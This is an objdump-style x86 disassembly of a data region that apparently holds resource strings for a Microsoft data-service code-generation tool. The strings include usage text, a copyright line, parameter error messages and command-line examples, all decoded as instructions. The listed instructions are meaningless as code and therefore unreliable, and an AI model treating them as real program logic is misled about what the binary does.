  4046af:	jae    0x4046b1
  4046b1:	arpl   WORD PTR [eax],ax
  4046b3:	jb     0x4046b5
  4046b5:	imul   eax,DWORD PTR [eax],0x740070
  4046bb:	imul   eax,DWORD PTR [eax],0x6e006f
  4046c1:	les    eax,FWORD PTR [esi]
  4046c3:	add    BYTE PTR [eax],al
  4046c5:	xor    al,0x55
  4046c7:	add    BYTE PTR [ebx+0x0],dh
  4046ca:	popa   
  4046cb:	add    BYTE PTR [edi+0x0],ah
  4046ce:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  4046d3:	add    BYTE PTR [esi+0x0],ch
  4046d6:	add    BYTE PTR [di+0x0],dh
  4046da:	popa   
  4046db:	add    BYTE PTR [edi+0x0],ah
  4046de:	add    BYTE PTR gs:[esi+0x0],dl
  4046e2:	bound  eax,QWORD PTR [eax]
  4046e4:	inc    esp
  4046e5:	add    BYTE PTR [ebp+0x0],ah
  4046e8:	jae    0x4046ea
  4046ea:	arpl   WORD PTR [eax],ax
  4046ec:	jb     0x4046ee
  4046ee:	imul   eax,DWORD PTR [eax],0x740070
  4046f4:	imul   eax,DWORD PTR [eax],0x6e006f
  4046fa:	jmp    0x20404705
  4046ff:	push   ebp
  404700:	add    BYTE PTR [ebx+0x0],dh
  404703:	popa   
  404704:	add    BYTE PTR [edi+0x0],ah
  404707:	add    BYTE PTR gs:[esi+0x0],cl
  40470b:	popa   
  40470c:	add    BYTE PTR [ebp+0x0],ch
  40470f:	add    BYTE PTR gs:[ecx+0x0],al
  404713:	outs   dx,BYTE PTR ds:[esi]
  404714:	add    BYTE PTR [eax+eax*1+0x45],ah
  404718:	add    BYTE PTR [esi+0x0],ch
  40471b:	jne    0x40471d
  40471d:	ins    DWORD PTR es:[edi],dx
  40471e:	add    BYTE PTR [esi],cl
  404720:	pop    es
  404721:	add    BYTE PTR [eax],al
  404723:	sub    dl,BYTE PTR [ebp+0x0]
  404726:	jae    0x404728
  404728:	popa   
  404729:	add    BYTE PTR [edi+0x0],ah
  40472c:	add    BYTE PTR gs:[esi+0x0],cl
  404730:	popa   
  404731:	add    BYTE PTR [ebp+0x0],ch
  404734:	add    BYTE PTR gs:[ecx+0x0],al
  404738:	outs   dx,BYTE PTR ds:[esi]
  404739:	add    BYTE PTR [eax+eax*1+0x56],ah
  40473d:	add    BYTE PTR [ecx+0x0],ah
  404740:	ins    BYTE PTR es:[edi],dx
  404741:	add    BYTE PTR [ebp+0x0],dh
  404744:	add    BYTE PTR gs:[esi+0x0],cl
  404748:	popa   
  404749:	add    BYTE PTR [ebp+0x0],ch
  40474c:	add    BYTE PTR gs:[eax],bl
  40474f:	pop    es
  404750:	add    BYTE PTR [eax],al
  404752:	sub    al,0x55
  404754:	add    BYTE PTR [ebx+0x0],dh
  404757:	popa   
  404758:	add    BYTE PTR [edi+0x0],ah
  40475b:	add    BYTE PTR gs:[esi+0x0],cl
  40475f:	outs   dx,DWORD PTR ds:[esi]
  404760:	add    BYTE PTR [eax+eax*1+0x6f],cl
  404764:	add    BYTE PTR [edi+0x0],ah
  404767:	outs   dx,DWORD PTR ds:[esi]
  404768:	add    BYTE PTR [eax+eax*1+0x65],al
  40476c:	add    BYTE PTR [ebx+0x0],dh
  40476f:	arpl   WORD PTR [eax],ax
  404771:	jb     0x404773
  404773:	imul   eax,DWORD PTR [eax],0x740070
  404779:	imul   eax,DWORD PTR [eax],0x6e006f
  40477f:	and    al,0x7
  404781:	add    BYTE PTR [eax],al
  404783:	cmp    al,0x55
  404785:	add    BYTE PTR [ebx+0x0],dh
  404788:	popa   
  404789:	add    BYTE PTR [edi+0x0],ah
  40478c:	add    BYTE PTR gs:[edi+0x0],cl
  404790:	jne    0x404792
  404792:	je     0x404794
  404794:	dec    edi
  404795:	add    BYTE PTR [edx+0x0],ah
  404798:	push   0x0
  40479a:	add    BYTE PTR gs:[ebx+0x0],ah
  40479e:	je     0x4047a0
  4047a0:	dec    esp
  4047a1:	add    BYTE PTR [ecx+0x0],ah
  4047a4:	jns    0x4047a6
  4047a6:	add    BYTE PTR gs:[edx+0x0],dh
  4047aa:	inc    esp
  4047ab:	add    BYTE PTR [ebp+0x0],ah
  4047ae:	jae    0x4047b0
  4047b0:	arpl   WORD PTR [eax],ax
  4047b2:	jb     0x4047b4
  4047b4:	imul   eax,DWORD PTR [eax],0x740070
  4047ba:	imul   eax,DWORD PTR [eax],0x6e006f
  4047c0:	inc    eax
  4047c1:	pop    es
  4047c2:	add    BYTE PTR [eax],al
  4047c4:	adc    al,0x55
  4047c6:	add    BYTE PTR [ebx+0x0],dh
  4047c9:	popa   
  4047ca:	add    BYTE PTR [edi+0x0],ah
  4047cd:	add    BYTE PTR gs:[eax+eax*1+0x69],dl
  4047d2:	add    BYTE PTR [eax+eax*1+0x6c],dh
  4047d6:	add    BYTE PTR [ebp+0x0],ah
  4047d9:	jno    0x4047e2
  4047db:	add    BYTE PTR [eax],al
  4047dd:	es push ebp
  4047df:	add    BYTE PTR [ebx+0x0],dh
  4047e2:	popa   
  4047e3:	add    BYTE PTR [edi+0x0],ah
  4047e6:	add    BYTE PTR gs:[ebp+0x0],dl
  4047ea:	jb     0x4047ec
  4047ec:	imul   eax,DWORD PTR [eax],0x650044
  4047f2:	jae    0x4047f4
  4047f4:	arpl   WORD PTR [eax],ax
  4047f6:	jb     0x4047f8
  4047f8:	imul   eax,DWORD PTR [eax],0x740070
  4047fe:	imul   eax,DWORD PTR [eax],0x6e006f
  404804:	jle    0x40480d
  404806:	add    BYTE PTR [eax],al
  404808:	and    dl,BYTE PTR [ebp+0x0]
  40480b:	jae    0x40480d
  40480d:	popa   
  40480e:	add    BYTE PTR [edi+0x0],ah
  404811:	add    BYTE PTR gs:[ebp+0x0],dl
  404815:	jb     0x404817
  404817:	imul   eax,DWORD PTR [eax],0x610056
  40481d:	ins    BYTE PTR es:[edi],dx
  40481e:	add    BYTE PTR [ebp+0x0],dh
  404821:	add    BYTE PTR gs:[esi+0x0],cl
  404825:	popa   
  404826:	add    BYTE PTR [ebp+0x0],ch
  404829:	add    BYTE PTR gs:[ecx+0x22000007],ch
  404830:	push   ebp
  404831:	add    BYTE PTR [ebx+0x0],dh
  404834:	popa   
  404835:	add    BYTE PTR [edi+0x0],ah
  404838:	add    BYTE PTR gs:[esi+0x0],dl
  40483c:	add    BYTE PTR gs:[edx+0x0],dh
  404840:	jae    0x404842
  404842:	imul   eax,DWORD PTR [eax],0x6e006f
  404848:	xor    DWORD PTR [eax],eax
  40484a:	inc    esp
  40484b:	add    BYTE PTR [edi+0x0],ch
  40484e:	je     0x404850
  404850:	xor    BYTE PTR [eax],al
  404852:	scas   al,BYTE PTR es:[edi]
  404853:	pop    es
  404854:	add    BYTE PTR [eax],al
  404856:	and    dl,BYTE PTR [ebp+0x0]
  404859:	jae    0x40485b
  40485b:	popa   
  40485c:	add    BYTE PTR [edi+0x0],ah
  40485f:	add    BYTE PTR gs:[esi+0x0],dl
  404863:	add    BYTE PTR gs:[edx+0x0],dh
  404867:	jae    0x404869
  404869:	imul   eax,DWORD PTR [eax],0x6e006f
  40486f:	xor    al,BYTE PTR [eax]
  404871:	inc    esp
  404872:	add    BYTE PTR [edi+0x0],ch
  404875:	je     0x404877
  404877:	xor    BYTE PTR [eax],al
  404879:	repz pop es
  40487b:	add    BYTE PTR [eax],al
  40487d:	pop    esp
  40487e:	push   esi
  40487f:	add    BYTE PTR [ebp+0x0],ah
  404882:	jb     0x404884
  404884:	jae    0x404886
  404886:	imul   eax,DWORD PTR [eax],0x6e006f
  40488c:	push   esi
  40488d:	add    BYTE PTR [ecx],dh
  40488f:	add    BYTE PTR [edx+0x0],dl
  404892:	add    BYTE PTR gs:[ecx+0x0],dh
  404896:	jne    0x404898
  404898:	imul   eax,DWORD PTR [eax],0x650072
  40489e:	jae    0x4048a0
  4048a0:	push   ebp
  4048a1:	add    BYTE PTR [ebx+0x0],dh
  4048a4:	add    BYTE PTR gs:[eax+eax*1+0x61],al
  4048a9:	add    BYTE PTR [eax+eax*1+0x61],dh
  4048ad:	add    BYTE PTR [ebx+0x0],dl
  4048b0:	add    BYTE PTR gs:[edx+0x0],dh
  4048b4:	jbe    0x4048b6
  4048b6:	imul   eax,DWORD PTR [eax],0x650063
  4048bc:	inc    ebx
  4048bd:	add    BYTE PTR [edi+0x0],ch
  4048c0:	ins    BYTE PTR es:[edi],dx
  4048c1:	add    BYTE PTR [eax+eax*1+0x65],ch
  4048c5:	add    BYTE PTR [ebx+0x0],ah
  4048c8:	je     0x4048ca
  4048ca:	imul   eax,DWORD PTR [eax],0x6e006f
  4048d0:	inc    esi
  4048d1:	add    BYTE PTR [ecx+0x0],ah
  4048d4:	ins    BYTE PTR es:[edi],dx
  4048d5:	add    BYTE PTR [ebx+0x0],dh
  4048d8:	add    BYTE PTR gs:[eax],bh
  4048db:	or     BYTE PTR [eax],al
  4048dd:	add    BYTE PTR [edi+edx*2],ch
  4048e0:	add    BYTE PTR [edx+0x0],dh
  4048e3:	imul   eax,DWORD PTR [eax],0x690074
  4048e9:	outs   dx,BYTE PTR ds:[esi]
  4048ea:	add    BYTE PTR [edi+0x0],ah
  4048ed:	dec    edi
  4048ee:	add    BYTE PTR [edx+0x0],ah
  4048f1:	push   0x0
  4048f3:	add    BYTE PTR gs:[ebx+0x0],ah
  4048f7:	je     0x4048f9
  4048f9:	dec    esp
  4048fa:	add    BYTE PTR [ecx+0x0],ah
  4048fd:	jns    0x4048ff
  4048ff:	add    BYTE PTR gs:[edx+0x0],dh
  404903:	inc    esi
  404904:	add    BYTE PTR [ecx+0x0],ch
  404907:	ins    BYTE PTR es:[edi],dx
  404908:	add    BYTE PTR [ebp+0x0],ah
  40490b:	mov    ds:0x2a000008,al
  404910:	pop    edx
  404911:	add    BYTE PTR [ebp+0x0],ah
  404914:	jb     0x404916
  404916:	outs   dx,DWORD PTR ds:[esi]
  404917:	add    BYTE PTR [esi+0x0],al
  40491a:	imul   eax,DWORD PTR [eax],0x65006c
  404920:	jae    0x404922
  404922:	inc    esi
  404923:	add    BYTE PTR [edi+0x0],ch
  404926:	jb     0x404928
  404928:	push   eax
  404929:	add    BYTE PTR [ecx+0x0],ah
  40492c:	jb     0x40492e
  40492e:	popa   
  40492f:	add    BYTE PTR [ebp+0x0],ch
  404932:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  404937:	add    BYTE PTR [edx+0x0],dh
  40493a:	ror    BYTE PTR [eax],0x0
  40493d:	add    BYTE PTR [ecx],al
  40493f:	pop    ebp
  404940:	dec    ebp
  404941:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404948:	je     0x40496a
  40494a:	sub    BYTE PTR [edx+0x29],dl
  40494d:	and    BYTE PTR [ebx+0x30],bh
  404950:	jge    0x404972
  404952:	jbe    0x4049b9
  404954:	jb     0x4049c9
  404956:	imul   ebp,DWORD PTR [edi+0x6e],0x7d317b20
  40495d:	or     eax,0x706f430a
  404962:	jns    0x4049d6
  404964:	imul   esp,DWORD PTR [edi+0x68],0x43282074
  40496b:	sub    DWORD PTR [eax],esp
  40496d:	xor    dh,BYTE PTR [eax]
  40496f:	xor    BYTE PTR [eax],bh
  404971:	and    BYTE PTR [ebp+0x69],cl
  404974:	arpl   WORD PTR [edx+0x6f],si
  404977:	jae    0x4049e8
  404979:	data16 je 0x40499c
  40497c:	inc    ebx
  40497d:	outs   dx,DWORD PTR ds:[esi]
  40497e:	jb     0x4049f0
  404980:	outs   dx,DWORD PTR ds:[esi]
  404981:	jb     0x4049e4
  404983:	je     0x4049ee
  404985:	outs   dx,DWORD PTR ds:[esi]
  404986:	outs   dx,BYTE PTR ds:[esi]
  404987:	and    BYTE PTR cs:[ecx+0x6c],al
  40498b:	ins    BYTE PTR es:[edi],dx
  40498c:	and    BYTE PTR [edx+0x69],dh
  40498f:	addr16 push 0x72207374
  404995:	gs jae 0x4049fd
  404998:	jb     0x404a10
  40499a:	gs fs add DWORD PTR cs:[ecx+0x65685401],ecx
  4049a3:	and    BYTE PTR [eax+0x61],dh
  4049a6:	jb     0x404a09
  4049a8:	ins    DWORD PTR es:[edi],dx
  4049a9:	gs je  0x404a11
  4049ac:	jb     0x4049ce
  4049ae:	daa    
  4049af:	jnp    0x4049e1
  4049b1:	jge    0x4049da
  4049b3:	and    BYTE PTR [ecx+0x73],ch
  4049b6:	and    BYTE PTR [esi+0x6f],ch
  4049b9:	je     0x4049db
  4049bb:	popa   
  4049bc:	and    BYTE PTR [ebx+0x6f],ah
  4049bf:	jb     0x404a33
  4049c1:	arpl   WORD PTR gs:[esp+ebp*2+0x79],si
  4049c6:	and    BYTE PTR [esi+0x6f],ah
  4049c9:	jb     0x404a38
  4049cb:	gs and BYTE PTR fs:[eax+0x61],dh
  4049d0:	jb     0x404a33
  4049d2:	ins    DWORD PTR es:[edi],dx
  4049d3:	gs je  0x404a3b
  4049d6:	jb     0x404a06
  4049d8:	and    BYTE PTR [eax],ah
  4049da:	inc    ecx
  4049db:	ins    BYTE PTR es:[edi],dx
  4049dc:	ins    BYTE PTR es:[edi],dx
  4049dd:	and    BYTE PTR [ebx+0x77],dh
  4049e0:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x6d207365
  4049e8:	jne    0x404a5d
  4049ea:	je     0x404a0c
  4049ec:	bound  esp,QWORD PTR [ebp+0x67]
  4049ef:	imul   ebp,DWORD PTR [esi+0x20],0x68746977
  4049f6:	and    BYTE PTR [edi],ah
  4049f8:	das    
  4049f9:	daa    
  4049fa:	and    BYTE PTR [ecx+0x6e],ah
  4049fd:	and    BYTE PTR fs:[ebx+0x65],dh
  404a01:	jo     0x404a64
  404a03:	jb     0x404a66
  404a05:	je     0x404a6c
  404a07:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404a0b:	and    BYTE PTR [esi+0x61],ch
  404a0e:	ins    DWORD PTR es:[edi],dx
  404a0f:	and    BYTE PTR gs:[esi+0x72],ah
  404a13:	outs   dx,DWORD PTR ds:[esi]
  404a14:	ins    DWORD PTR es:[edi],dx
  404a15:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404a19:	and    BYTE PTR [esi+0x61],dh
  404a1c:	ins    BYTE PTR es:[edi],dx
  404a1d:	jne    0x404a84
  404a1f:	and    BYTE PTR [edi+0x69],dh
  404a22:	je     0x404a8c
  404a24:	and    BYTE PTR [edi],ah
  404a26:	cmp    ah,BYTE PTR [edi]
  404a28:	add    DWORD PTR cs:0x6f727265,eax
  404a2f:	jb     0x404a32
  404a31:	pop    es
  404a32:	jne    0x404aa2
  404a34:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  404a38:	outs   dx,BYTE PTR ds:[esi]
  404a39:	add    DWORD PTR [edi],eax
  404a3b:	ja     0x404a9e
  404a3d:	jb     0x404aad
  404a3f:	imul   ebp,DWORD PTR [esi+0x67],0x307b3301
  404a46:	jge    0x404a68
  404a48:	das    
  404a49:	outs   dx,DWORD PTR ds:[esi]
  404a4a:	jne    0x404ac0
  404a4c:	cmp    ah,BYTE PTR [edx]
  404a4e:	fs popa 
  404a50:	je     0x404ab3
  404a52:	arpl   WORD PTR cs:[ebx+0x22],si
  404a56:	and    BYTE PTR [edi],ch
  404a58:	jne    0x404acc
  404a5a:	imul   edi,DWORD PTR [edx],0x74746822
  404a60:	jo     0x404a9c
  404a62:	das    
  404a63:	das    
  404a64:	ins    BYTE PTR es:[edi],dx
  404a65:	outs   dx,DWORD PTR ds:[esi]
  404a66:	arpl   WORD PTR [ecx+0x6c],sp
  404a69:	push   0x2f74736f
  404a6e:	fs popa 
  404a70:	je     0x404ad3
  404a72:	cs jae 0x404aeb
  404a75:	arpl   WORD PTR [edx],sp
  404a77:	add    DWORD PTR ds:0x67206f54,esp
  404a7d:	outs   dx,BYTE PTR gs:[esi]
  404a7f:	gs jb  0x404ae3
  404a82:	je     0x404ae9
  404a84:	and    BYTE PTR [ebx+0x6f],ah
  404a87:	fs and BYTE PTR gs:[esi+0x72],ah
  404a8c:	outs   dx,DWORD PTR ds:[esi]
  404a8d:	ins    DWORD PTR es:[edi],dx
  404a8e:	and    BYTE PTR [ecx+0x20],ah
  404a91:	fs popa 
  404a93:	je     0x404af6
  404a95:	and    BYTE PTR [ebx+0x65],dh
  404a98:	jb     0x404b10
  404a9a:	imul   esp,DWORD PTR [ebx+0x65],0x7b22012e
  404aa1:	xor    BYTE PTR [ebp+0x20],bh
  404aa4:	das    
  404aa5:	outs   dx,DWORD PTR ds:[esi]
  404aa6:	jne    0x404b1c
  404aa8:	cmp    ah,BYTE PTR [edx]
  404aaa:	fs popa 
  404aac:	je     0x404b0f
  404aae:	arpl   WORD PTR cs:[ebx+0x22],si
  404ab2:	and    BYTE PTR [edi],ch
  404ab4:	imul   ebp,DWORD PTR [esi+0x3a],0x6c696622
  404abb:	gs arpl WORD PTR cs:[ebx+0x64],si
  404ac0:	ins    BYTE PTR es:[edi],dx
  404ac1:	and    al,BYTE PTR [ecx]
  404ac3:	cs push esp
  404ac5:	outs   dx,DWORD PTR ds:[esi]
  404ac6:	and    BYTE PTR [edi+0x65],ah
  404ac9:	outs   dx,BYTE PTR ds:[esi]
  404aca:	gs jb  0x404b2e
  404acd:	je     0x404b34
  404acf:	and    BYTE PTR [ebx+0x6f],ah
  404ad2:	fs and BYTE PTR gs:[esi+0x72],ah
  404ad7:	outs   dx,DWORD PTR ds:[esi]
  404ad8:	ins    DWORD PTR es:[edi],dx
  404ad9:	and    BYTE PTR [ecx+0x20],ah
  404adc:	arpl   WORD PTR [edi+0x6e],bp
  404adf:	arpl   WORD PTR [ebp+0x70],sp
  404ae2:	je     0x404b59
  404ae4:	popa   
  404ae5:	ins    BYTE PTR es:[edi],dx
  404ae6:	and    BYTE PTR [ebp+0x6f],ch
  404ae9:	fs gs ins BYTE PTR es:[edi],dx
  404aec:	and    BYTE PTR [esi+0x69],ah
  404aef:	ins    BYTE PTR es:[edi],dx
  404af0:	gs add DWORD PTR cs:[edx],esp
  404af4:	jnp    0x404b26
  404af6:	jge    0x404b18
  404af8:	das    
  404af9:	outs   dx,DWORD PTR ds:[esi]
  404afa:	jne    0x404b70
  404afc:	cmp    ah,BYTE PTR [edx]
  404afe:	fs popa 
  404b00:	je     0x404b63
  404b02:	arpl   WORD PTR cs:[ebx+0x22],si
  404b06:	and    BYTE PTR [edi],ch
  404b08:	imul   ebp,DWORD PTR [esi+0x3a],0x6c696622
  404b0f:	gs cs gs fs ins DWORD PTR es:[edi],dx
  404b14:	js     0x404b38
  404b16:	add    DWORD PTR [ecx],esi
  404b18:	push   esp
  404b19:	outs   dx,DWORD PTR ds:[esi]
  404b1a:	and    BYTE PTR [edi+0x65],ah
  404b1d:	outs   dx,BYTE PTR ds:[esi]
  404b1e:	gs jb  0x404b82
  404b21:	je     0x404b88
  404b23:	and    BYTE PTR [ebx+0x6f],ah
  404b26:	fs and BYTE PTR gs:[esi+0x72],ah
  404b2b:	outs   dx,DWORD PTR ds:[esi]
  404b2c:	ins    DWORD PTR es:[edi],dx
  404b2d:	and    BYTE PTR [ecx+0x20],ah
  404b30:	outs   dx,BYTE PTR gs:[esi]
  404b32:	je     0x404b9d
  404b34:	je     0x404baf
  404b36:	and    BYTE PTR [ebp+eiz*2+0x73],ah
  404b3a:	imul   esp,DWORD PTR [edi+0x6e],0x646f6d20
  404b41:	gs ins BYTE PTR es:[edi],dx
  404b43:	and    BYTE PTR [esi+0x69],ah
  404b46:	ins    BYTE PTR es:[edi],dx
  404b47:	gs add DWORD PTR cs:[eax],ecx
  404b4b:	inc    ebp
  404b4c:	js     0x404baf
  404b4e:	ins    DWORD PTR es:[edi],dx
  404b4f:	jo     0x404bbd
  404b51:	gs jae 0x404b55
  404b54:	mov    ds:0x74694501,al
  404b59:	push   0x74207265
  404b5e:	push   0x75272065
  404b63:	jb     0x404bce
  404b65:	daa    
  404b66:	and    BYTE PTR [edi+0x72],ch
  404b69:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404b6d:	and    BYTE PTR [edi],ah
  404b6f:	imul   ebp,DWORD PTR [esi+0x27],0x72617020
  404b76:	popa   
  404b77:	ins    DWORD PTR es:[edi],dx
  404b78:	gs je  0x404be0
  404b7b:	jb     0x404bf0
  404b7d:	and    BYTE PTR [ebx+0x61],ah
  404b80:	outs   dx,BYTE PTR ds:[esi]
  404b81:	and    BYTE PTR [edx+0x65],ah
  404b84:	and    BYTE PTR [ebp+0x73],dh
  404b87:	gs fs sub al,0x20
  404b8b:	bound  esi,QWORD PTR [ebp+0x74]
  404b8e:	and    BYTE PTR [esi+0x6f],ch
  404b91:	je     0x404bb3
  404b93:	bound  ebp,QWORD PTR [edi+0x74]
  404b96:	push   0x6857202e
  404b9b:	outs   dx,BYTE PTR gs:[esi]
  404b9d:	and    BYTE PTR [ebp+0x73],dh
  404ba0:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  404ba7:	and    BYTE PTR [edi],ah
  404ba9:	jne    0x404c1d
  404bab:	imul   esp,DWORD PTR [edi],0x72617020
  404bb1:	popa   
  404bb2:	ins    DWORD PTR es:[edi],dx
  404bb3:	gs je  0x404c1b
  404bb6:	jb     0x404be4
  404bb8:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404bbc:	and    BYTE PTR [edi],ah
  404bbe:	jne    0x404c33
  404bc0:	gs jb  0x404c31
  404bc3:	popa   
  404bc4:	ins    DWORD PTR es:[edi],dx
  404bc5:	gs daa 
  404bc7:	and    BYTE PTR [ecx+0x6e],ah
  404bca:	and    BYTE PTR fs:[edi],ah
  404bcd:	jo     0x404c30
  404bcf:	jae    0x404c44
  404bd1:	ja     0x404c42
  404bd3:	jb     0x404c39
  404bd5:	daa    
  404bd6:	and    BYTE PTR [eax+0x61],dh
  404bd9:	jb     0x404c3c
  404bdb:	ins    DWORD PTR es:[edi],dx
  404bdc:	gs je  0x404c44
  404bdf:	jb     0x404c54
  404be1:	and    BYTE PTR [ebx+0x61],ah
  404be4:	outs   dx,BYTE PTR ds:[esi]
  404be5:	and    BYTE PTR [ecx+0x6c],ah
  404be8:	jae    0x404c59
  404bea:	and    BYTE PTR [edx+0x65],ah
  404bed:	and    BYTE PTR [ebx+0x70],dh
  404bf0:	arpl   WORD PTR gs:[ecx+0x66],bp
  404bf4:	imul   esp,DWORD PTR [ebp+0x64],0x3c0e012e
  404bfb:	inc    esi
  404bfc:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x6e6b6e55
  404c04:	outs   dx,DWORD PTR ds:[esi]
  404c05:	ja     0x404c75
  404c07:	add    DWORD PTR ds:[edi],ebp
  404c0a:	inc    edi
  404c0b:	outs   dx,BYTE PTR gs:[esi]
  404c0d:	gs jb  0x404c71
  404c10:	je     0x404c7b
  404c12:	outs   dx,DWORD PTR ds:[esi]
  404c13:	outs   dx,BYTE PTR ds:[esi]
  404c14:	and    BYTE PTR [ebx+0x6f],al
  404c17:	ins    DWORD PTR es:[edi],dx
  404c18:	jo     0x404c86
  404c1a:	gs je  0x404c82
  404c1d:	and    BYTE PTR ds:0x307b202d,ch
  404c23:	jge    0x404c45
  404c25:	gs jb  0x404c9a
  404c28:	outs   dx,DWORD PTR ds:[esi]
  404c29:	jb     0x404c9e
  404c2b:	sub    al,0x20
  404c2d:	jnp    0x404c60
  404c2f:	jge    0x404c51
  404c31:	ja     0x404c94
  404c33:	jb     0x404ca3
  404c35:	imul   ebp,DWORD PTR [esi+0x67],0x505b0173
  404c3c:	popa   
  404c3d:	jb     0x404ca0
  404c3f:	ins    DWORD PTR es:[edi],dx
  404c40:	gs je  0x404ca8
  404c43:	jb     0x404c65
  404c45:	push   esi
  404c46:	popa   
  404c47:	ins    BYTE PTR es:[edi],dx
  404c48:	jne    0x404caf
  404c4a:	and    BYTE PTR [edi],ah
  404c4c:	jnp    0x404c7e
  404c4e:	jge    0x404c77
  404c50:	and    BYTE PTR [ecx+0x73],ch
  404c53:	and    BYTE PTR [esi+0x6f],ch
  404c56:	je     0x404c78
  404c58:	jbe    0x404cbb
  404c5a:	ins    BYTE PTR es:[edi],dx
  404c5b:	imul   esp,DWORD PTR [eax+eiz*1+0x66],0x7420726f
  404c63:	push   0x61702065
  404c68:	jb     0x404ccb
  404c6a:	ins    DWORD PTR es:[edi],dx
  404c6b:	gs je  0x404cd3
  404c6e:	jb     0x404c90
  404c70:	daa    
  404c71:	jnp    0x404ca4
  404c73:	jge    0x404c9c
  404c75:	and    BYTE PTR cs:[eax],ah
  404c78:	push   esi
  404c79:	popa   
  404c7a:	ins    BYTE PTR es:[edi],dx
  404c7b:	imul   esp,DWORD PTR [eax+eiz*1+0x76],0x65756c61
  404c83:	jae    0x404ca5
  404c85:	popa   
  404c86:	jb     0x404ced
  404c88:	and    BYTE PTR [edi+0x6e],ch
  404c8b:	and    BYTE PTR gs:[edi+0x66],ch
  404c8f:	and    BYTE PTR [edi],ah
  404c91:	jnp    0x404cc5
  404c93:	jge    0x404cbc
  404c95:	add    DWORD PTR cs:[edi+0x41],ebx
  404c99:	and    BYTE PTR [esi+0x69],ah
  404c9c:	ins    BYTE PTR es:[edi],dx
  404c9d:	and    BYTE PTR gs:[edi+0x69],dh
  404ca1:	je     0x404d0b
  404ca3:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404ca7:	and    BYTE PTR [ebp+0x78],ah
  404caa:	je     0x404d11
  404cac:	outs   dx,BYTE PTR ds:[esi]
  404cad:	jae    0x404d18
  404caf:	outs   dx,DWORD PTR ds:[esi]
  404cb0:	outs   dx,BYTE PTR ds:[esi]
  404cb1:	and    BYTE PTR [edi],ah
  404cb3:	jnp    0x404ce5
  404cb5:	jge    0x404cde
  404cb7:	and    BYTE PTR [edi+0x61],dh
  404cba:	jae    0x404cdc
  404cbc:	imul   esi,DWORD PTR [bp+0x65],0x6f66206e
  404cc4:	jb     0x404ce6
  404cc6:	popa   
  404cc7:	jb     0x404d30
  404cc9:	jne    0x404d38
  404ccb:	outs   dx,BYTE PTR gs:[esi]
  404ccd:	je     0x404cef
  404ccf:	daa    
  404cd0:	jnp    0x404d03
  404cd2:	jge    0x404cfb
  404cd4:	and    BYTE PTR cs:[eax],ah
  404cd7:	push   esp
  404cd8:	push   0x65722065
  404cdd:	jno    0x404d54
  404cdf:	imul   esi,DWORD PTR [edx+0x65],0x78652064
  404ce6:	je     0x404d4d
  404ce8:	outs   dx,BYTE PTR ds:[esi]
  404ce9:	jae    0x404d54
  404ceb:	outs   dx,DWORD PTR ds:[esi]
  404cec:	outs   dx,BYTE PTR ds:[esi]
  404ced:	and    BYTE PTR [ecx+0x73],ch
  404cf0:	and    BYTE PTR [edi],ah
  404cf2:	jnp    0x404d26
  404cf4:	jge    0x404d1d
  404cf6:	add    DWORD PTR cs:[eax+edx*2],esp
  404cfa:	popa   
  404cfb:	jb     0x404d5e
  404cfd:	ins    DWORD PTR es:[edi],dx
  404cfe:	gs je  0x404d66
  404d01:	jb     0x404d23
  404d03:	jae    0x404d7c
  404d05:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x307b2720
  404d0d:	jge    0x404d36
  404d0f:	and    BYTE PTR [ecx+0x73],ch
  404d12:	and    BYTE PTR [esi+0x6f],ch
  404d15:	je     0x404d37
  404d17:	jbe    0x404d7a
  404d19:	ins    BYTE PTR es:[edi],dx
  404d1a:	imul   esp,DWORD PTR [esi+ebp*1+0x1],0x6568544c
  404d22:	and    BYTE PTR [eax+0x61],dh
  404d25:	je     0x404d8f
  404d27:	and    BYTE PTR [edi],ah
  404d29:	jnp    0x404d5b
  404d2b:	jge    0x404d54
  404d2d:	and    BYTE PTR [ebx+0x70],dh
  404d30:	arpl   WORD PTR gs:[ecx+0x66],bp
  404d34:	imul   esp,DWORD PTR [ebp+0x64],0x206e6920
  404d3b:	je     0x404da5
  404d3d:	and    BYTE PTR gs:[ecx+0x72],ah
  404d41:	addr16 jne 0x404db1
  404d44:	outs   dx,BYTE PTR gs:[esi]
  404d46:	je     0x404d68
  404d48:	daa    
  404d49:	jnp    0x404d7c
  404d4b:	jge    0x404d74
  404d4d:	and    BYTE PTR [edi+ebp*2+0x65],ah
  404d51:	jae    0x404d73
  404d53:	outs   dx,BYTE PTR ds:[esi]
  404d54:	outs   dx,DWORD PTR ds:[esi]
  404d55:	je     0x404d77
  404d57:	imul   ebp,DWORD PTR [esi+0x63],0x6564756c
  404d5e:	and    BYTE PTR [ecx+0x20],ah
  404d61:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x616e
  404d68:	ins    DWORD PTR es:[edi],dx
  404d69:	gs add DWORD PTR cs:0x20656854,esp
  404d71:	daa    
  404d72:	jnp    0x404da4
  404d74:	jge    0x404d9d
  404d76:	and    BYTE PTR [eax+0x61],dh
  404d79:	jb     0x404ddc
  404d7b:	ins    DWORD PTR es:[edi],dx
  404d7c:	gs je  0x404de4
  404d7f:	jb     0x404da1
  404d81:	jbe    0x404de4
  404d83:	ins    BYTE PTR es:[edi],dx
  404d84:	jne    0x404deb
  404d86:	and    BYTE PTR [ecx+0x73],ch
  404d89:	and    BYTE PTR [ebp+0x69],ch
  404d8c:	jae    0x404e01
  404d8e:	imul   ebp,DWORD PTR [esi+0x67],0x5428012e
  404d95:	push   0x65722065
  404d9a:	jno    0x404e11
  404d9c:	imul   esi,DWORD PTR [edx+0x65],0x61702064
  404da3:	jb     0x404e06
  404da5:	ins    DWORD PTR es:[edi],dx
  404da6:	gs je  0x404e0e
  404da9:	jb     0x404dcb
  404dab:	daa    
  404dac:	jnp    0x404dde
  404dae:	jge    0x404dd7
  404db0:	and    BYTE PTR [ecx+0x73],ch
  404db3:	and    BYTE PTR [ebp+0x69],ch
  404db6:	jae    0x404e2b
